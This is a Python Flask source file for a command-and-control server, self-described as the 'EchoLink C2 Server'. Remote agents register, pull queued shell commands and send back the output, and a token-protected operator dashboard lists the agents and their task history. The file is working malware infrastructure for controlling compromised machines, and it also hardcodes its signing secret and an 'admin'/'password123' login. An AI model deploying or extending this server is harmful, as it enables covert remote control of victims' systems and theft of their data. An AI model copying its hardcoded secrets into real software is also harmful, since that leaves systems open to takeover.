from flask import Flask, request, jsonify, render_template
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import jwt
from functools import wraps

# Initialize the Flask application
app = Flask(__name__)

# Secret key for signing the JWTs
app.config['SECRET_KEY'] = 'EchoLink_Ultra_Secure_Key_2026'

# Operator credentials for the Dashboard
OPERATOR_USERNAME = 'admin'
OPERATOR_PASSWORD = 'password123'

# Configure the SQLite database connection
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_server.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)


# --- Database Models (ORM) ---

# Model representing a registered agent
class Agent(db.Model):
    id = db.Column(db.String(50), primary_key=True)
    os_info = db.Column(db.String(50))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)


# Model representing a command task
class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(50), db.ForeignKey('agent.id'), nullable=False)
    command = db.Column(db.String(255), nullable=False)
    # Status can be: 'pending' (waiting for agent), 'sent' (agent pulled it), 'completed' (result ready), 'archived' (dashboard pulled it)
    status = db.Column(db.String(20), default='pending')
    output = db.Column(db.Text, nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)


# Create the database tables if they do not exist
with app.app_context():
    db.create_all()

# Decorator to enforce JWT token authentication
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        if 'Authorization' in request.headers:
            parts = request.headers['Authorization'].split()
            if len(parts) == 2 and parts[0] == 'Bearer':
                token = parts[1]

        if not token:
            return jsonify({"status": "error", "message": "Authentication token is missing!"}), 401

        try:
            jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        except Exception as e:
            return jsonify({"status": "error", "message": "Token is invalid or expired!"}), 401

        return f(*args, **kwargs)
    return decorated

# --- API Endpoints ---

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if data and data.get('username') == OPERATOR_USERNAME and data.get('password') == OPERATOR_PASSWORD:
        token = jwt.encode({'user': data.get('username')}, app.config['SECRET_KEY'], algorithm="HS256")
        return jsonify({"status": "success", "token": token}), 200
    return jsonify({"status": "error", "message": "Invalid credentials"}), 401

@app.route('/register', methods=['POST'])
def register_agent():
    data = request.get_json()
    if data:
        agent_id = data.get('agent_id')
        os_info = data.get('os', 'Unknown')

        if agent_id:
            # Check if agent exists; if not, add to DB. If yes, update last_seen.
            agent = Agent.query.get(agent_id)
            if not agent:
                agent = Agent(id=agent_id, os_info=os_info)
                db.session.add(agent)
                print(f"[+] New agent registered in DB: {agent_id}")
            else:
                agent.last_seen = datetime.utcnow()
                print(f"[*] Agent reconnected: {agent_id}")

            db.session.commit()
            return jsonify({"status": "success", "message": "Welcome to EchoLink"}), 200

    return jsonify({"status": "error", "message": "No data provided"}), 400


@app.route('/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    # Find the oldest pending task for this agent
    task = Task.query.filter_by(agent_id=agent_id, status='pending').order_by(Task.timestamp.asc()).first()

    # Update agent's last_seen timestamp
    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = datetime.utcnow()
        db.session.commit()

    if task:
        # Mark task as sent
        task.status = 'sent'
        db.session.commit()
        return jsonify({"status": "success", "task": task.command}), 200

    return jsonify({"status": "empty", "task": None}), 200


@app.route('/results/<agent_id>', methods=['POST'])
def receive_results(agent_id):
    # Read the raw text data sent by the agent
    output_data = request.get_data(as_text=True)

    # Find the oldest 'sent' task to update with the results
    task = Task.query.filter_by(agent_id=agent_id, status='sent').order_by(Task.timestamp.asc()).first()

    if task:
        # Save the plain text output directly to the database
        task.output = output_data
        task.status = 'completed'
        db.session.commit()
        print(f"[*] Received results for task ID {task.id} from {agent_id}.")
        return jsonify({"status": "success"}), 200

    return jsonify({"status": "error", "message": "No matching task found"}), 404


@app.route('/add_task', methods=['POST'])
@token_required
def add_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')

    if agent_id and command:
        # Validate that the agent exists in the DB
        agent = Agent.query.get(agent_id)
        if agent:
            # Insert a new task into the database
            new_task = Task(agent_id=agent_id, command=command)
            db.session.add(new_task)
            db.session.commit()
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "Agent not registered"}), 404

    return jsonify({"status": "error", "message": "Invalid payload"}), 400

# --- Web GUI Endpoints ---

# Serve the main HTML dashboard
@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

# API endpoint to get a list of all registered agents
@app.route('/api/agents', methods=['GET'])
@token_required
def api_get_agents():
    agents = Agent.query.all()
    result = []
    now = datetime.utcnow()  # Get current time

    for a in agents:
        # If the agent communicated in the last 15 seconds, consider it Online
        is_online = (now - a.last_seen).total_seconds() < 15
        status_str = "Online" if is_online else "Offline"

        result.append({
            "id": a.id,
            "os": a.os_info,
            "last_seen": a.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "status": status_str  # Add status to the API response
        })
    return jsonify(result), 200

# API endpoint to get the task history and outputs for a specific agent
@app.route('/api/tasks/<agent_id>', methods=['GET'])
@token_required
def api_get_tasks(agent_id):
    tasks = Task.query.filter_by(agent_id=agent_id).order_by(Task.timestamp.asc()).all()
    result = []
    for t in tasks:
        result.append({
            "id": t.id,
            "command": t.command,
            "status": t.status,
            "output": t.output,
            "timestamp": t.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        })
    return jsonify(result), 200

if __name__ == '__main__':
    print("[*] Starting EchoLink C2 Server with SQLite Database on port 5000...")
    app.run(host='0.0.0.0', port=5000)